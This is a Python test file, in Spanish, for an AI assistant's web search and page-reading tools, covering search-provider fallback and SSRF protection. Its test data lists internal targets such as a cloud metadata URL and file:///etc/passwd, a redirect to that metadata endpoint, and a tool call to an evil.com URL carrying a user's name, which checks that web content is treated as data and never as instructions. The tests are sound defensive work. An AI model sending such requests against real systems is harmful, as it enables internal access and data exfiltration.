"""Búsqueda web: adaptadores (Tavily, SearXNG, lector directo), respaldo entre proveedores, defensas de SSRF y
las tools locales `buscar_web` y `leer_pagina` dentro del loop del agente."""

import json
from datetime import date

import httpx
import pytest

from asistente.core.llm.base import LlamadaTool, Mensaje
from asistente.core.llm.falso import LLMFalso, pide, texto
from asistente.core.ports import LimiteExcedido, ResultadoTool
from asistente.core.prompts import Prompts
from asistente.core.web import herramientas as webtools
from asistente.core.web.base import (
    Busqueda,
    CupoAgotado,
    NoSoportado,
    PaginaWeb,
    ResultadoWeb,
    UrlNoPermitida,
    WebError,
)
from asistente.core.web.directo import LectorDirecto, texto_de_html, validar_url
from asistente.core.web.respaldo import WebConRespaldo
from asistente.core.web.searxng import WebSearxng
from asistente.core.web.tavily import WebTavily
from test_agent import AuditoriaFalsa, ConectorFalso, LimitesFalsos, contexto


def cliente(manejador) -> httpx.AsyncClient:
    return httpx.AsyncClient(transport=httpx.MockTransport(manejador), follow_redirects=False)


# ───────────────────────── Tavily ─────────────────────────

async def test_tavily_busca_con_la_clave_en_la_cabecera_y_recorta():
    vistos = []

    def h(req: httpx.Request):
        vistos.append(req)
        return httpx.Response(200, json={"results": [
            {"title": "Soja", "url": "https://a.com/soja", "content": "x" * 900},
            {"title": "", "url": "https://b.com/", "content": "b"},
            {"title": "malo", "url": "javascript:alert(1)", "content": "no"},
        ]})

    t = WebTavily("tvly-secreta", cliente=cliente(h))
    res = await t.buscar("precio soja", max_resultados=5)
    assert [r.url for r in res] == ["https://a.com/soja", "https://b.com/"]
    assert len(res[0].fragmento) == 600 and res[1].titulo == "https://b.com/"
    assert vistos[0].headers["authorization"] == "Bearer tvly-secreta"
    cuerpo = json.loads(vistos[0].content)
    assert cuerpo["query"] == "precio soja" and cuerpo["max_results"] == 5 and cuerpo["search_depth"] == "basic"


@pytest.mark.parametrize("status", [432, 433])
async def test_tavily_sin_cupo_lanza_cupo_agotado(status):
    t = WebTavily("k", cliente=cliente(lambda r: httpx.Response(status, json={"detail": {"error": "limit"}})))
    with pytest.raises(CupoAgotado):
        await t.buscar("x", max_resultados=3)


async def test_tavily_otro_error_es_web_error_sin_la_clave():
    t = WebTavily("tvly-secreta", cliente=cliente(lambda r: httpx.Response(401, json={"detail": "bad key"})))
    with pytest.raises(WebError) as e:
        await t.buscar("x", max_resultados=3)
    assert not isinstance(e.value, CupoAgotado) and "tvly-secreta" not in str(e.value)


async def test_tavily_lee_y_trunca():
    def h(req):
        assert req.url.path == "/extract" and json.loads(req.content)["urls"] == ["https://a.com/p"]
        return httpx.Response(200, json={"results": [{"url": "https://a.com/p", "raw_content": "abcdef"}],
                                         "failed_results": []})

    p = await WebTavily("k", cliente=cliente(h)).leer("https://a.com/p", max_chars=4)
    assert p.texto == "abcd" and p.truncado


async def test_tavily_lectura_fallida_es_web_error():
    h = lambda r: httpx.Response(200, json={"results": [], "failed_results": [{"url": "u", "error": "404"}]})
    with pytest.raises(WebError):
        await WebTavily("k", cliente=cliente(h)).leer("https://a.com/p", max_chars=100)


# ───────────────────────── SearXNG ─────────────────────────

async def test_searxng_pide_json_y_quita_duplicados():
    def h(req):
        assert req.url.path == "/search" and req.url.params["format"] == "json"
        assert req.url.params["language"] == "es"
        return httpx.Response(200, json={"results": [
            {"title": "A", "url": "https://a.com/", "content": "uno"},
            {"title": "A bis", "url": "https://a.com/", "content": "dup"},
            {"title": "B", "url": "https://b.com/", "content": "dos"},
            {"title": "C", "url": "https://c.com/", "content": "tres"},
        ]})

    res = await WebSearxng("http://searxng:8080", cliente=cliente(h)).buscar("q", max_resultados=2, idioma="es")
    assert [r.url for r in res] == ["https://a.com/", "https://b.com/"]


async def test_searxng_sin_json_habilitado_explica_el_403():
    with pytest.raises(WebError, match="search.formats"):
        await WebSearxng("http://s", cliente=cliente(lambda r: httpx.Response(403))).buscar("q", max_resultados=3)


async def test_searxng_con_todos_los_buscadores_caidos_es_error():
    h = lambda r: httpx.Response(200, json={"results": [], "unresponsive_engines": [["google", "captcha"]]})
    with pytest.raises(WebError):
        await WebSearxng("http://s", cliente=cliente(h)).buscar("q", max_resultados=3)


async def test_searxng_no_lee_paginas():
    with pytest.raises(NoSoportado):
        await WebSearxng("http://s").leer("https://a.com", max_chars=10)


# ───────────────────────── Respaldo ─────────────────────────

class ProveedorFalso:
    def __init__(self, nombre, falla=None, falla_leer=None):
        self.nombre, self.falla, self.falla_leer = nombre, falla, falla_leer
        self.busquedas = self.lecturas = 0

    async def buscar(self, consulta, *, max_resultados, idioma=None):
        self.busquedas += 1
        if self.falla:
            raise self.falla
        return [ResultadoWeb(f"{self.nombre}: {consulta}", f"https://{self.nombre}.com/", "frag")]

    async def leer(self, url, *, max_chars):
        self.lecturas += 1
        if self.falla_leer:
            raise self.falla_leer
        return PaginaWeb(url, "T", "texto")


class Reloj:
    def __init__(self):
        self.t = 0.0

    def __call__(self):
        return self.t


async def test_respaldo_pasa_a_searxng_cuando_tavily_agota_el_cupo_y_lo_pausa():
    tavily, searx, reloj = ProveedorFalso("tavily", CupoAgotado("432")), ProveedorFalso("searxng"), Reloj()
    web = WebConRespaldo([tavily, searx], pausa_cupo_s=100, reloj=reloj)
    b = await web.buscar("q", max_resultados=3)
    assert b.proveedor == "searxng" and tavily.busquedas == 1
    await web.buscar("q", max_resultados=3)
    assert tavily.busquedas == 1 and searx.busquedas == 2  # pausado: no se le gasta una petición por consulta
    tavily.falla, reloj.t = None, 101
    assert (await web.buscar("q", max_resultados=3)).proveedor == "tavily"


async def test_respaldo_con_todos_pausados_prueba_igual():
    a, b, reloj = ProveedorFalso("a", WebError("x")), ProveedorFalso("b", WebError("y")), Reloj()
    web = WebConRespaldo([a, b], pausa_falla_s=60, reloj=reloj)
    with pytest.raises(WebError, match="ningún proveedor"):
        await web.buscar("q", max_resultados=3)
    b.falla = None
    assert (await web.buscar("q", max_resultados=3)).proveedor == "b"  # los dos pausados: se prueban en orden
    assert a.busquedas == 2


async def test_respaldo_lee_saltando_a_quien_no_lee_y_no_reintenta_una_url_prohibida():
    tavily = ProveedorFalso("tavily", falla_leer=CupoAgotado("432"))
    searx = ProveedorFalso("searxng", falla_leer=NoSoportado("no"))
    directo = ProveedorFalso("directo")
    web = WebConRespaldo([tavily, searx, directo])
    p = await web.leer("https://a.com/", max_chars=100)
    assert p.proveedor == "directo" and searx.lecturas == 1
    directo.falla_leer = UrlNoPermitida("privada")
    web = WebConRespaldo([directo, ProveedorFalso("otro")])
    with pytest.raises(UrlNoPermitida):
        await web.leer("https://a.com/", max_chars=100)


# ───────────────────────── Lector directo y SSRF ─────────────────────────

@pytest.mark.parametrize("url", [
    "http://localhost/", "http://127.0.0.1/", "http://10.0.0.5/", "http://192.168.1.1/", "http://172.17.0.1/",
    "http://169.254.169.254/latest/meta-data/", "http://[::1]/", "http://[::ffff:127.0.0.1]/", "http://0.0.0.0/",
    "https://a.com:8443/", "ftp://a.com/", "file:///etc/passwd", "https://user:pw@a.com/", "http://postgres:5432/",
    "http://searxng/", "http://app.internal/", "http://impresora.local/", "javascript:alert(1)", "http:///x",
])
def test_validar_url_rechaza_destinos_internos(url):
    with pytest.raises(UrlNoPermitida):
        validar_url(url)


def test_validar_url_acepta_un_sitio_publico_y_quita_el_fragmento():
    assert validar_url("https://Ejemplo.com/a?b=1#seccion") == "https://Ejemplo.com/a?b=1"
    assert validar_url("http://8.8.8.8") == "http://8.8.8.8/"


def resolver_fijo(tabla):
    async def resolver(host, puerto):
        return tabla[host]
    return resolver


async def test_lector_rechaza_un_host_que_resuelve_a_una_ip_privada():
    llamado = []
    lector = LectorDirecto(cliente=cliente(lambda r: llamado.append(r) or httpx.Response(200)),
                           resolver=resolver_fijo({"trampa.com": ["93.184.216.34", "10.0.0.1"]}))
    with pytest.raises(UrlNoPermitida):
        await lector.leer("https://trampa.com/", max_chars=100)
    assert llamado == []  # ni siquiera se conecta


async def test_lector_conecta_a_la_ip_comprobada_con_host_y_sni_originales():
    vistos = []

    def h(req: httpx.Request):
        vistos.append(req)
        html = ("<html><head><title>Soja hoy</title><script>robar()</script></head><body><nav>menú</nav>"
                "<h1>Precio</h1><p>La soja cotiza&nbsp;estable.</p><footer>pie</footer></body></html>")
        return httpx.Response(200, headers={"content-type": "text/html; charset=utf-8"}, content=html.encode())

    lector = LectorDirecto(cliente=cliente(h), resolver=resolver_fijo({"ejemplo.com": ["93.184.216.34"]}))
    p = await lector.leer("https://ejemplo.com/soja?x=1", max_chars=1000)
    req = vistos[0]
    assert req.url.host == "93.184.216.34" and req.url.path == "/soja" and req.url.query == b"x=1"
    assert req.headers["host"] == "ejemplo.com" and req.extensions["sni_hostname"] == "ejemplo.com"
    assert p.titulo == "Soja hoy" and "La soja cotiza estable." in p.texto and "Precio" in p.texto
    assert "robar" not in p.texto and "menú" not in p.texto and "pie" not in p.texto


async def test_lector_revisa_cada_redireccion():
    def h(req):
        return httpx.Response(302, headers={"location": "http://169.254.169.254/latest/meta-data/"})

    lector = LectorDirecto(cliente=cliente(h), resolver=resolver_fijo({"a.com": ["93.184.216.34"]}))
    with pytest.raises(UrlNoPermitida):
        await lector.leer("https://a.com/", max_chars=100)


async def test_lector_sigue_una_redireccion_publica_y_corta_las_infinitas():
    def h(req):
        if req.headers["host"] == "a.com":
            return httpx.Response(301, headers={"location": "https://b.com/destino"})
        return httpx.Response(200, headers={"content-type": "text/plain"}, content=b"hola")

    tabla = {"a.com": ["93.184.216.34"], "b.com": ["93.184.216.35"]}
    p = await LectorDirecto(cliente=cliente(h), resolver=resolver_fijo(tabla)).leer("https://a.com/", max_chars=100)
    assert p.url == "https://b.com/destino" and p.texto == "hola"
    bucle = lambda r: httpx.Response(302, headers={"location": "/otra"})
    with pytest.raises(WebError, match="redirecciones"):
        await LectorDirecto(cliente=cliente(bucle), resolver=resolver_fijo(tabla)).leer("https://a.com/", max_chars=9)


async def test_lector_rechaza_lo_que_no_es_html_y_limita_el_tamano():
    tabla = {"a.com": ["93.184.216.34"]}
    pdf = lambda r: httpx.Response(200, headers={"content-type": "application/pdf"}, content=b"%PDF")
    with pytest.raises(WebError, match="HTML"):
        await LectorDirecto(cliente=cliente(pdf), resolver=resolver_fijo(tabla)).leer("https://a.com/", max_chars=9)
    grande = lambda r: httpx.Response(200, headers={"content-type": "text/plain"}, content=b"a" * 5000)
    lector = LectorDirecto(cliente=cliente(grande), resolver=resolver_fijo(tabla), max_bytes=1000)
    p = await lector.leer("https://a.com/", max_chars=10_000)
    assert len(p.texto) == 1000


def test_texto_de_html_tolera_html_roto():
    titulo, t = texto_de_html("<div><p>uno<br>dos<li>tres</div></span><script>x")
    assert titulo is None and t.split() == ["uno", "dos", "tres"]


# ───────────────────────── Tools ─────────────────────────

def test_urls_permitidas_salen_de_resultados_de_busqueda_y_del_usuario():
    r = ResultadoTool(True, {"resultados": [{"url": "https://A.com/x#frag"}]}, fuente=webtools.FUENTE_BUSQUEDA)
    falsa = ResultadoTool(True, {"resultados": [{"url": "https://evil.com/"}]}, fuente="sistema")
    mensajes = [
        Mensaje("user", "mirá https://doc.org/guia, y (https://otra.org/p)."),
        Mensaje("tool", json.dumps(r.para_modelo()), llamada_id="1"),
        Mensaje("tool", json.dumps(falsa.para_modelo()), llamada_id="2"),
        Mensaje("assistant", "leé https://inventada.com/"),
    ]
    assert webtools.urls_permitidas(mensajes) == {"https://a.com/x", "https://doc.org/guia", "https://otra.org/p"}


class WebFalsa:
    def __init__(self, falla=None):
        self.falla = falla
        self.busquedas, self.lecturas = [], []

    async def buscar(self, consulta, *, max_resultados, idioma=None):
        self.busquedas.append((consulta, max_resultados, idioma))
        if self.falla:
            raise self.falla
        return Busqueda("tavily", (ResultadoWeb("Guía", "https://doc.org/guia", "fragmento"),))

    async def leer(self, url, *, max_chars):
        self.lecturas.append(url)
        return PaginaWeb(url, "Guía", "contenido", proveedor="directo")


class LimitesWeb(LimitesFalsos):
    def __init__(self, falla_web=None):
        super().__init__()
        self.falla_web, self.web = falla_web, 0

    async def reservar_web(self, sistema_id, usuario_ref, tope_min, tope_dia):
        self.web += 1
        if self.falla_web:
            raise LimiteExcedido(self.falla_web)


async def correr_web(llm, web, *, limites=None, historial=None, ctx=None):
    from asistente.core.agent import run_turn

    eventos = []

    async def emit(ev, datos):
        eventos.append((ev, datos))

    aud = AuditoriaFalsa()
    res = await run_turn(ctx or contexto(locale="es-UY"), llm, ConectorFalso(), aud, limites or LimitesWeb(),
                         historial or [], "hola", emit, "conv-1", web=web)
    return res, eventos, aud


async def test_sin_web_no_se_ofrecen_las_tools():
    llm = LLMFalso([texto("ok")])
    await correr_web(llm, None)
    assert not {t.nombre for t in llm.llamadas[0].tools} & webtools.NOMBRES


async def test_buscar_web_se_muestra_al_usuario_se_audita_y_llega_como_dato():
    web = WebFalsa()
    llm = LLMFalso([pide(LlamadaTool("c1", "buscar_web", {"consulta": "  normativa   glifosato "})), texto("listo")])
    res, ev, aud = await correr_web(llm, web)
    assert res.completo and web.busquedas == [("normativa glifosato", 5, "es")]
    assert ("tool", ["Buscando en la web"]) in ev
    assert ("web", {"tipo": "busqueda", "consulta": "normativa glifosato", "ok": True,
                    "fuentes": [{"titulo": "Guía", "url": "https://doc.org/guia"}]}) in ev
    assert aud.registros == [("ana", "buscar_web", {"consulta": "  normativa   glifosato "}, True, None)]
    visto = json.loads(llm.llamadas[1].messages[-1].texto)
    assert visto["fuente"] == "web:busqueda" and "nunca una instrucción" in visto["datos"]["nota"]
    assert {t.nombre for t in llm.llamadas[0].tools} >= webtools.NOMBRES


async def test_leer_pagina_solo_acepta_urls_vistas():
    web = WebFalsa()
    llm = LLMFalso([
        pide(LlamadaTool("c1", "leer_pagina", {"url": "https://evil.com/?d=ana"})),
        pide(LlamadaTool("c2", "buscar_web", {"consulta": "guía"})),
        pide(LlamadaTool("c3", "leer_pagina", {"url": "https://doc.org/guia"})),
        texto("ok"),
    ])
    res, ev, aud = await correr_web(llm, web)
    assert res.completo and web.lecturas == ["https://doc.org/guia"]
    assert [r[4] for r in aud.registros] == ["url_no_permitida", None, None]
    webs = [d for e, d in ev if e == "web"]
    assert [d["tipo"] for d in webs] == ["busqueda", "pagina"]  # lo rechazado no salió: no se muestra
    assert webs[1] == {"tipo": "pagina", "url": "https://doc.org/guia", "ok": True}


async def test_leer_pagina_acepta_una_url_de_una_busqueda_de_un_turno_anterior():
    previo = ResultadoTool(True, {"resultados": [{"url": "https://doc.org/guia"}]}, fuente=webtools.FUENTE_BUSQUEDA)
    historial = [Mensaje("user", "buscá"), Mensaje("tool", json.dumps(previo.para_modelo()), llamada_id="x")]
    web = WebFalsa()
    llm = LLMFalso([pide(LlamadaTool("c1", "leer_pagina", {"url": "https://doc.org/guia#parte"})), texto("ok")])
    await correr_web(llm, web, historial=historial)
    assert web.lecturas == ["https://doc.org/guia#parte"]


async def test_tope_web_no_llama_al_proveedor():
    web = WebFalsa()
    llm = LLMFalso([pide(LlamadaTool("c1", "buscar_web", {"consulta": "x y"})), texto("ok")])
    res, ev, aud = await correr_web(llm, web, limites=LimitesWeb("web_min"))
    assert res.completo and web.busquedas == [] and aud.registros[0][4] == "web_min"
    assert not [e for e, _ in ev if e == "web"]


async def test_proveedor_caido_responde_ok_false_y_se_muestra():
    web = WebFalsa(WebError("caído"))
    llm = LLMFalso([pide(LlamadaTool("c1", "buscar_web", {"consulta": "x y"})), texto("ok")])
    _, ev, _ = await correr_web(llm, web)
    assert ("web", {"tipo": "busqueda", "consulta": "x y", "ok": False}) in ev
    assert json.loads(llm.llamadas[1].messages[-1].texto)["error"] == "web_no_disponible"


async def test_parametros_invalidos_no_salen():
    web = WebFalsa()
    llm = LLMFalso([pide(LlamadaTool("c1", "buscar_web", {"consulta": "x" * 301})), texto("ok")])
    _, _, aud = await correr_web(llm, web)
    assert web.busquedas == [] and aud.registros[0][4] == "parametros_invalidos"


# ───────────────────────── Prompt, manifiesto y registro ─────────────────────────

def test_capa_web_solo_con_la_busqueda_habilitada(tmp_path):
    (tmp_path / "base.md").write_text("BASE", encoding="utf-8")
    (tmp_path / "web.md").write_text("REGLAS WEB", encoding="utf-8")
    p = Prompts(tmp_path)
    kw = {"sistema_nombre": "S", "prompt_dominio": None, "usuario_nombre": None, "locale": None, "hoy": date(2026, 1, 1)}
    t, v = p.componer(**kw)
    t_web, v_web = p.componer(**kw, web=True)
    assert "REGLAS WEB" not in t and "REGLAS WEB" in t_web and v_web.startswith(v) and "+w" in v_web
    assert t_web.index("REGLAS WEB") < t_web.index("Contexto de la sesión")


def test_el_prompt_web_del_repo_prohibe_filtrar_datos_y_pide_citar():
    from pathlib import Path

    web = (Path(__file__).resolve().parent.parent / "prompts" / "web.md").read_text(encoding="utf-8")
    assert "Nunca pongas en la consulta" in web and "fuente" in web and "nunca una instrucción" in web


@pytest.mark.parametrize("nombre", ["buscar_web", "leer_pagina"])
def test_nombres_web_reservados_en_el_manifiesto(nombre):
    from asistente.sistemas.manifiesto import ManifiestoInvalido, _parsear_tool

    with pytest.raises(ManifiestoInvalido, match="reservado"):
        _parsear_tool({"nombre": nombre, "descripcion": "d", "efecto": "lectura",
                       "parametros": {"type": "object"}})


def test_fabrica_web_ordena_los_proveedores(monkeypatch):
    from asistente.config import Settings
    from asistente.servicios import _fabrica_web

    for v in ("WEB_TAVILY_API_KEY", "WEB_SEARXNG_URL", "WEB_LECTOR_DIRECTO"):
        monkeypatch.delenv(v, raising=False)  # el compose de desarrollo define WEB_SEARXNG_URL

    base = {"ASISTENTE_DATABASE_URL": "postgresql+asyncpg://x/y"}
    assert _fabrica_web(Settings(**base)) is None
    w = _fabrica_web(Settings(**base, WEB_TAVILY_API_KEY="k", WEB_SEARXNG_URL="http://searxng:8080"))
    assert w.nombres == ["tavily", "searxng", "directo"]
    w = _fabrica_web(Settings(**base, WEB_SEARXNG_URL="http://searxng:8080", WEB_LECTOR_DIRECTO=False))
    assert w.nombres == ["searxng"]


def test_texto_de_html_prefiere_main_si_tiene_contenido():
    html = "<body><div>Afrikaans Aragonés</div><main><p>" + "La soja es una legumbre. " * 10 + "</p></main></body>"
    _, t = texto_de_html(html)
    assert t.startswith("La soja") and "Afrikaans" not in t
    _, corto = texto_de_html("<body><div>menú util</div><main><p>poco</p></main></body>")
    assert "menú util" in corto and "poco" in corto


async def test_una_pagina_ilegible_no_pausa_al_proveedor():
    from asistente.core.web.base import PaginaIlegible

    directo = ProveedorFalso("directo", falla_leer=PaginaIlegible("es un PDF"))
    web = WebConRespaldo([ProveedorFalso("searxng", falla_leer=NoSoportado("no")), directo])
    with pytest.raises(WebError):
        await web.leer("https://a.com/doc.pdf", max_chars=100)
    directo.falla_leer = None
    assert (await web.leer("https://a.com/otra", max_chars=100)).proveedor == "directo"


async def test_un_pausado_se_prueba_despues_de_los_libres():
    a, b, reloj = ProveedorFalso("a", WebError("caído")), ProveedorFalso("b", NoSoportado("no")), Reloj()
    web = WebConRespaldo([a, b], pausa_falla_s=60, reloj=reloj)
    with pytest.raises(WebError):
        await web.buscar("q", max_resultados=3)
    a.falla = None  # sigue pausado, pero el único libre no busca: se lo prueba igual
    assert (await web.buscar("q", max_resultados=3)).proveedor == "a"


async def test_tope_de_busquedas_por_turno():
    from asistente.core.agent import ConfigTurno, run_turn

    web = WebFalsa()
    llm = LLMFalso([pide(*[LlamadaTool(f"c{i}", "buscar_web", {"consulta": f"q {i}"}) for i in range(3)]),
                    pide(LlamadaTool("c9", "buscar_web", {"consulta": "otra"})), texto("ok")])

    async def emit(ev, datos):
        pass

    res = await run_turn(contexto(), llm, ConectorFalso(), AuditoriaFalsa(), LimitesWeb(), [], "hola", emit,
                         "conv-1", ConfigTurno(web_max_por_turno=2), web=web)
    assert res.completo and len(web.busquedas) == 2
    errores = [json.loads(m.texto).get("error") for m in res.nuevos if m.rol == "tool"]
    assert errores == [None, None, "tope_web_turno", "tope_web_turno"]


def test_el_historial_conserva_titulos_y_urls_de_busquedas_anteriores():
    from asistente.store.repo import recortar

    busqueda = ResultadoTool(True, {"consulta": "q", "resultados": [
        {"titulo": "Guía", "url": "https://doc.org/guia", "fragmento": "texto largo"}], "nota": "n"},
        fuente=webtools.FUENTE_BUSQUEDA)
    otra = ResultadoTool(True, {"hectareas": 540.5})
    mensajes = [Mensaje("user", "buscá"), Mensaje("assistant", "", (LlamadaTool("1", "buscar_web", {}),
                                                                     LlamadaTool("2", "lista", {}))),
                Mensaje("tool", json.dumps(busqueda.para_modelo()), llamada_id="1"),
                Mensaje("tool", json.dumps(otra.para_modelo()), llamada_id="2")]
    viejo = recortar(mensajes, 10)
    compacto = json.loads(viejo[2].texto)
    assert compacto["datos"]["resultados"] == [{"titulo": "Guía", "url": "https://doc.org/guia"}]
    assert "texto largo" not in viejo[2].texto and "540" not in viejo[3].texto
    assert webtools.urls_permitidas(viejo) == {"https://doc.org/guia"}
